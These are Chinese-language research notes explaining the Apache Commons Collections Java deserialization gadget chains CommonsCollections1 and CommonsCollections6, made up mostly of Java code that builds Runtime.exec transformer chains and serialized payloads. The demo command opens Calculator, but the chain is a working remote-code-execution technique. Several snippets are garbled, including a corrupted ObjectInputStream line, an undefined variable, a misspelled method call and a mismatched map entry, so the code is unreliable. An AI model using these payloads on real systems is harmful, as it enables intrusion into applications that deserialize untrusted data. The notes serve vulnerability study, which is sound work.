## CommonsCollections1&CommonsCollections6

### TransformedMap调用链

```java
    public static void main(String[] args) {
        String cmd  = "open /System/Applications/Calculator.app";
        String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform(null);

        //创建AnnotationInvocationHandler对象 对map.class的动态代理对象
        Map map = new HashMap();

        Map transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

        transformedMap.put("key","value");

//        for (Object obj : transformedMap.entrySet()) {
//            Map.Entry entry = (Map.Entry) obj;
//
//            // setValue最终调用到InvokerTransformer的transform方法,从而触发Runtime命令执行调用链
//            entry.setValue("test");
//        }
```

#### ChainedTransformer

实现Transform接口的一个类，构造时传入Transform列表，他的transform()方法将构造时传入的数组穿起来

前一个的返回结果作为下一个的参数

```java
    public Object transform(Object object) {
        for(int i = 0; i < this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);
        }
        return object;
    }
```

#### ConstantTransformer

也是实现了tansformer接口的类，构造时传入一个对象并保存在iConstant属性，在调用transform()时将这个对象返回

```java
    public ConstantTransformer(Object constantToReturn) {
        this.iConstant = constantToReturn;
    }

    public Object transform(Object input) {
        return this.iConstant;
    }
```

#### InvokerTransformer

同样是实现Transform接口的类，构造时传入方法名，参数类型和参数值，调用transform()时传入被调用对象

InvokerTransformer类的transform方法导致命令执行：

```java
    public Object transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
            } catch (NoSuchMethodException var5) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException var6) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException var7) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
            }
        }
    }
```

#### 生成可利用的序列化数据：


```java
        Class ann_clazz = Class.forName(ANN_INV_HANDLER_CLASS);

        // 获取AnnotationInvocationHandler类的构造方法
        Constructor constructor = ann_clazz.getDeclaredConstructor(Class.class, Map.class);

        // 设置构造方法的访问权限
        constructor.setAccessible(true);

        //AnnotationInvocationHandler类实例
        Object instance = constructor.newInstance(Target.class, transformedMap);

        // 创建用于存储payload的二进制输出流对象 创建Java对象序列化输出流对象
        ObjectOutputStream out = new ObjectOutputStream(new ByteArrayOutputStream());
        out.writeObject(instance);
        out.flush();
        out.close();

        byte[] bytes = baos.toByteArray();

        // 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象
        ObjectInputStream in = new ObjectInputStream(banew ByteArrayInputStream(bytes)is);

        in.readObject();
        in.close();

    }
}
```

#### AnnotationInvocationHandler

利用`AnnotationInvocationHandler`#readObject()触发漏洞

AnnotationInvocationHandler类的构造函数有两个参数，第⼀个参数是⼀个Annotation类；第⼆个是参数就是前⾯构造的Map

> AnnotationInvocationHandler类是私有类，不能直接new出来。


调用TransformedMap的setValue/put/putAll中的任意方法都会调用InvokerTransformer类的transform方法，就会触发命令执行

- 可以触发此调用链的场景

 - 只要在Java的API中的任何一个类实现了java.io.Serializable接口
 - 可以传入构建的TransformedMap对象
 - 要有调用TransformedMap中的setValue/put/putAll中的任意方法一个方法的类
 - 在Java反序列化的时候触发InvokerTransformer类的transform方法实现RCE

 > 在jdk1.7u80中调用链可以顺利执行，jdk1.8u71之后AnnotationInvocationHandler类的readObject()方法中new一个信息map替换我们构造的map导致命令无法执行。无法执行，代码如下。


```java
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        var1.defaultReadObject();
        AnnotationType var2 = null;
        try {
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var3 = var2.memberTypes();
        Iterator var4 = this.memberValues.entrySet().iterator();

        while(var4.hasNext()) {
            Entry var5 = (Entry)var4.next();
            String var6 = (String)var5.getKey();
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    //这里调用的setValue()->checkSetValue()->valueTransformer.transform(value)
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                }
            }
        }

    }

```

- 1.8u71之后 无法触发

```java
    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        GetField var2 = var1.readFields();
        Class var3 = (Class)var2.get("type", (Object)null);
        Map var4 = (Map)var2.get("memberValues", (Object)null);
        AnnotationType var5 = null;

        try {
            var5 = AnnotationType.getInstance(var3);
        } catch (IllegalArgumentException var13) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var6 = var5.memberTypes();
        LinkedHashMap var7 = new LinkedHashMap(); //这里new一个map,不在使用我们构造的map 导致漏洞不存在

        String var10;
        Object var11;
        for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) {
            Entry var9 = (Entry)var8.next();
            var10 = (String)var9.getKey();
            var11 = null;
            Class var12 = (Class)var6.get(var10);
            if (var12 != null) {
                var11 = var9.getValue();
                if (!var12.isInstance(var11) && !(var11 instanceof ExceptionProxy)) {
                    //zheli 
                    var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + "[" + var11 + "]")).setMember((Method)var5.members().get(var10));
                }
            }
        }

        AnnotationInvocationHandler.UnsafeAccessor.setType(this, var3);
        AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, var7);
    }
```

### LazyMap调用链 ysoserial-CommonsCollections1 

Lazy触发点和TransformedMap不同，TransformedMap触发转换是在设置值时，而LazyMap是在get操作时没有找到对应的值时会调用transform返回一个转换后的对象，后半段执行命令的利用链和上面的一致，不同的是触发方式,创建一个lazyMap：

```java
Map lm = LazyMap.decorate(innerMap,chainedTransformer);
```

AnnotationInvocationHandler类的readObject()没有调用LazyMap的get方法，但是在invoke中有调用，invoke会在代理对象被访问时调用

AnnotationInvocationHandler实现了InvocationHandler接口，可以作为代理对象的handler，创建一个代理对象

```java
Class ann_clazz = Class.forName(ANN_INV_HANDLER_CLASS);
    Constructor constructor = ann_clazz.getDeclaredConstructor(Class.class, Map.class);
    constructor.setAccessible(true);
    InvocationHandler ih = (InvocationHandler) constructor.newInstance(Target.class, lm);

    Map proxymap = (Map) Proxy.newProxyInstance(lm.getClass().getClassLoader(),new Class[]{Map.class},ih);
```

- 通过`chainedTransformer`构造的LazyMap创建`AnnotationInvocationHandler`实例
- 并且需要调用`AnnotationInvocationHandler`#invoke方法触发命令执行
- 通过刚才创建的`AnnotationInvocationHandler`实例创建map.class(可以是任意对象)的代理对象proxyMap,当调用proxyMap任意方法时触发`AnnotationInvocationHandler`#invoke()->触发lazuMap#get()->命令执行
- 如果序列化这个proxyMap对象,反序列化时调用Map#readObkect(),无法触发invoke()

所以需要用AnnotationInvocationHandler包裹，将这个map作为AnnotationInvocationHandler的memberValue参数：

```java
InvocationHandler aih = (InvocationHandler) constructor.newInstance(Target.class, proxymap);
```

此时,反序列化上面的InvocationHandler实例时:`AnnotationInvocationHandler`#readOject()->proxymap#anything->`AnnotationInvocationHandler`#invoke()->lazyMap#get()->命令执行


> LazyMap利用链在jdk1.8u71版本后不能成功执行命令，原因是sun.reflect.annotation.AnnotationInvocationHandler#readObject 的逻辑变了

### TiedMapEntry ysoserial-CommonsCollections6

工具的CommonsCollections6解决jdk版本限制，可以做到通杀jdk7,8

```text
/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()

    by @matthias_kaisercommons-collections:commons-collections:3.1
*/
```

利用链的后半部分org.apache.commons.collections.map.LazyMap.get()开始是上面的利用链，前半部分则使用了TiedMapEntry类来触发，源码如下：    


```java
public class TiedMapEntry implements Entry, KeyValue, Serializable {
    private static final long serialVersionUID = -8453869361373831205L;
    private final Map map;
    private final Object key;

    public TiedMapEntry(Map map, Object key) {
        this.map = map;
        this.key = key;
    }

    public Object getKey() {
        return this.key;
    }

    public Object getValue() {
        return this.map.get(this.key);
    }

    public Object setValue(Object value) {
        if (value == this) {
            throw new IllegalArgumentException("Cannot set value to this map entry");
        } else {
            return this.map.put(this.key, value);
        }
    }

    public int hashCode() {
        Object value = this.getValue();
        return (this.getKey() == null ? 0 : this.getKy().hashCode()) ^ (value == null ? 0 : value.hashCode());
    }
}
```

上面写过LazyMap#get()方法调用时会触发transform导致命令执行，在TiedMapEntry#getValue中调用了Map的get方法

而属性map是在构建TiedMapEntry对象的传入的参数，在TiedMapEntry#hashCode中调用了TiedMapEntry#getValue

这里和urldns利用链的前半部分一样了，HashMap#hash中调用了hashCode方法，而HashMap#readObject调用了hash

```java
        String cmd = "open /System/Applications/Calculator.app";
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };


        Transformer[] fake_transformers = new Transformer[]{new ConstantTransformer(1)};
        ChainedTransformer chainedTransformer = new ChainedTransformer(fake_transformers);

        Map innerMap = new HashMap();


        Map outerMap = LazyMap.decorate(innerMap,chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,"key");

        Map serMap = new HashMap();
        serMap.put(outerMap,"value");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chainedTransformer,transformers);
```

LazyMap#get中触发transform方法之前存在判断：

```java
    public Object get(Object key) {
        if (!super.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            super.map.put(key, value);
            return value;
        } else {
            return super.map.get(key);
        }
    }
}
```
